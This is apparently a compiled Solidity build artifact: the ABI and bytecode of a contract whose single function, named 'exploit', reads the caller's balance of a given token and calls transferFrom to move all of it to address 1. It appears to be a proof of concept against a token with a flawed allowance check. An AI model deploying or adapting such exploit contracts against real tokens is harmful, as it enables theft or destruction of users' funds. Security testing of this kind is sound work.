{"abi":[{"type":"function","name":"exploit","inputs":[{"name":"token","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5061021c8061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80630aeb4ddf1461002d575b5f5ffd5b61004061003b366004610176565b610042565b005b6040517f70a0823100000000000000000000000000000000000000000000000000000000815233600482015281905f9073ffffffffffffffffffffffffffffffffffffffff8316906370a0823190602401602060405180830381865afa1580156100ae573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100d291906101b0565b6040517f23b872dd000000000000000000000000000000000000000000000000000000008152336004820152600160248201526044810182905290915073ffffffffffffffffffffffffffffffffffffffff8316906323b872dd906064016020604051808303815f875af115801561014c573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061017091906101c7565b50505050565b5f60208284031215610186575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff811681146101a9575f5ffd5b9392505050565b5f602082840312156101c0575f5ffd5b5051919050565b5f602082840312156101d7575f5ffd5b815180151581146101a9575f5ffdfea264697066735822122090ac87178347f11b80e249bca3c5be6c054b4b2d0c6f02ea15b0513c4093b96a64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit(address)":"0aeb4ddf"},"id":0}